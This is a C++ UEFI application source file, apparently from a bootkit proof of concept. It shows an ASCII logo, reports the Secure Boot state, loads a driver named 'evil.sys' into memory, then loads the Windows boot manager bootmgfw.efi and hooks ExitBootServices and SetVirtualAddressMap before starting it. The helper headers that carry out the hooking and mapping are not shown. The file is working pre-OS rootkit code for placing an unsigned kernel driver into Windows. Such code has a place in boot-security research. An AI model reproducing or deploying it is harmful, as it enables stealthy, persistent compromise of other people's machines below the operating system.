extern "C"
{

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Protocol/LoadedImage.h>
#include <Guid/GlobalVariable.h>

}

#include "LocateFile.hpp"
#include "ExitBootServices.hpp"
#include "SetVirtualAddressMap.hpp"
#include "Mapper.hpp"


const char logo_text[33][55] = {
"                        ######                        ",
"                     ############                     ",
"                  ##################                  ",
"              ##########################              ",
"           ################################           ",
"        ######################################        ",
"     ############################################     ",
"  ##################              ##################  ",
"#################                    #################",
"##############                          ##############",
"#############                            #############",
"############                              ############",
"###########           ##########        ##############",
"##########          ##############   #################",
"#########          ###################################",
"#########         #######################  ###### ####",
"#########         #####################      ##     ##",
"#########         #######################  ###### ####",
"#########          ###################################",
"##########          ##############   #################",
"###########           ##########        ##############",
"############                              ############",
"#############                            #############",
"##############                          ##############",
"#################                    #################",
"  ##################              ##################  ",
"     ############################################     ",
"        ######################################        ",
"           ################################           ",
"              ##########################              ",
"                  ##################                  ",
"                     ############                     ",
"                        ######                        "};

EFI_STATUS
EFIAPI
UefiMain(
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable)
{
  gST->ConOut->SetAttribute(gST->ConOut,EFI_GREEN);
  gST->ConOut->ClearScreen(gST->ConOut);

  for(int i = 0; i < 33; ++i){
    Print((CHAR16*)L"%a\n",logo_text[i]);
  }

  Print((CHAR16*)L"Hello from MEMORY DANGEROUS, BLAZZING SLOW and VULNERABLE C++!\n");
  {
    UINT8 SecureBoot;
    UINTN DataSize;
    if(EFI_ERROR(gRT->GetVariable((CHAR16*)L"SecureBoot",&gEfiGlobalVariableGuid,NULL,&DataSize,&SecureBoot)))
    {
      SecureBoot = 0;
    }
    Print((CHAR16*)L"SecureBoot status: %s\n", SecureBoot ? (CHAR16*)L"On" : (CHAR16*)L"Off");
  }
  
  Print((CHAR16*)L"Loading evil.sys to the memory...\n");
  if(!Mapper::LoadEvilSys())
  {
    Print((CHAR16*)L"Failed to load evil.sys to the memory...\n");
    return -1;
  }

  EFI_DEVICE_PATH* bootmgfw_path;
  if(Boot::LocateFile((CHAR16*)L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi",bootmgfw_path) != EFI_SUCCESS){
    Print((CHAR16*)L"Failed to locate bootmgfw.efi!\n");
    return -1;
  }
  EFI_HANDLE bootmgfw_handle;
  Print((CHAR16*)L"Loading bootmgfw.efi\n");
  if(gBS->LoadImage(TRUE, //yeah, we are booting "directly"
                    gImageHandle,
                    bootmgfw_path,
                    0,
                    0,
                    &bootmgfw_handle) != EFI_SUCCESS)
  {
    Print((CHAR16*)L"Failed to load bootmgfw.efi!\n");
    return -1;
  }

  EFI_LOADED_IMAGE* LoadedImage;
  if(gBS->HandleProtocol(bootmgfw_handle,&gEfiLoadedImageProtocolGuid,(void**)&LoadedImage) != EFI_SUCCESS)
  {
    Print((CHAR16*)L"Failed to handle EfiLoadedImageProtocol\n");
    gBS->UnloadImage(bootmgfw_handle);
    return -1;
  }
  
  LoadedImage->ParentHandle = 0; // yeah, we are booting "directly"

  Boot::HookExitBootServices();
  Boot::HookSetVirtualAddressMap();

  Print((CHAR16*)L"Starting bootmgfw.efi\n");
  Print((CHAR16*)L"Unplug your USB device... ");
  for(auto i = 0; i < 10; ++i){
    Print((CHAR16*)L"%d... ",10-i);
    gBS->Stall(1000000);
  }
  if(gBS->StartImage(bootmgfw_handle,NULL,NULL) != EFI_SUCCESS){
    Print((CHAR16*)L"Failed to start bootmgfw.efi!\n");
  }

  return EFI_SUCCESS;
}